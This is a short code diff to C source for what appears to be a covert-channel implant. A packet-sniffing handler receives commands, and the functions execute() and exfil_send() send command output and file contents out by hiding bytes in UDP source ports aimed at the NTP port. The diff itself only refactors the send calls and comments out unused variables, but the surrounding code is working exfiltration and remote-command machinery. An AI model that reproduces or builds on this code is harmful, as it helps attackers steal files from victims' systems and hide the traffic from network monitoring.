@@ -68,7 +68,7 @@ void pkt_handler(u_char *user, const struct pcap_pkthdr *pkt_info, const u_char 
 {
 	char *ptr;
 	char *data;
-	char *dec;
+//	char *dec;
 	char type;
 	int duplex = (int) user;
 	static char buf[MAX_LEN];
@@ -148,7 +148,7 @@ void execute(char *command, u_int32_t ip, u_int16_t port, int duplex)
 		for (int i = 0; i < tot_len; i += 8)
 		{
 			char frame[FRAM_SZ];
-			char *enc;
+//			char *enc;
 			char *ptr;
 			int fram_len;
 			uint16 src_port = 0;
@@ -173,7 +173,7 @@ void execute(char *command, u_int32_t ip, u_int16_t port, int duplex)
 				src_port += byte;
 				dst_port = PORT_NTP;
 
-				_sendUDP(ip, src_port, dst_port);
+				_send(ip, src_port, dst_port, CHAN_UDP);
 				usleep(SLEEP_TIME);
 			}
 		}
@@ -211,7 +211,7 @@ void exfil_send(uint32 ipaddr, char *path)
 		for (int i = 0; i < buflen; i += 8)
 		{
 			char frame[FRAM_SZ];
-			char * enc;
+//			char * enc;
 			char * ptr;
 			int fram_len;
 			ushort src_port = 0;
@@ -230,7 +230,7 @@ void exfil_send(uint32 ipaddr, char *path)
 
 			//free(enc);
 			
-			_sendUDP(ipaddr, src_port, dst_port);
+			_send(ipaddr, src_port, dst_port, CHAN_UDP);
 			
 			usleep(SLEEP_TIME);
 		}
